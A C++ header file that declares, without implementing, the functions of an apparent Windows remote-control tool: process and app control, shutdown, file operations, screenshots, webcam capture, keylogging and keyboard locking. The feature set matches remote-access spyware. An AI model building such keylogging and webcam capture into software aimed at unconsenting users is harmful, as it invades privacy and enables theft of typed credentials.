#pragma once

#include <atomic>
#include <chrono>
#include <codecvt>
#include <filesystem>
#include <fstream>
#include <iostream>
#include <locale>
#include <objidl.h>
#include <shlobj.h>
#include <string>
#include <thread>
#include <vector>
#include <windows.h>

#include "const.h"
#include "utils.h"

#pragma region Process operations
bool listProcess(std::string& result);
bool startProcess(std::string& processName, std::string& result);
bool stopProcess(std::string& processName, std::string& result);
#pragma endregion

#pragma region System operations
bool shutdown(std::string& result);
bool restart(std::string& result);
#pragma endregion

#pragma region File operations
bool listFiles(std::string& directory, std::string& result);
bool deleteFile(std::string& fileName, std::string& result);
bool moveFile(std::string& filenames, std::string& result);
bool copyFile(std::string& filenames, std::string& result);
#pragma endregion

#pragma region Screenshot operations
bool captureScreenshot(std::string& result, std::ifstream& in);
#pragma endregion

#pragma region Webcam operations
bool startWebcam(std::string& result);
bool stopWebcam(std::string& result, std::ifstream& output);
#pragma endregion

#pragma region App operations
bool listApps(std::string& result);
bool startApp(std::string name, std::string& result);
bool stopApp(std::string name, std::string& result);
#pragma endregion

#pragma region Keyboard operations
bool startKeylogger(std::string& result);
bool stopKeylogger(std::string& result, std::ifstream& file);
bool lockKeyboard(std::string& result);
bool unlockKeyboard(std::string& result);
#pragma endregion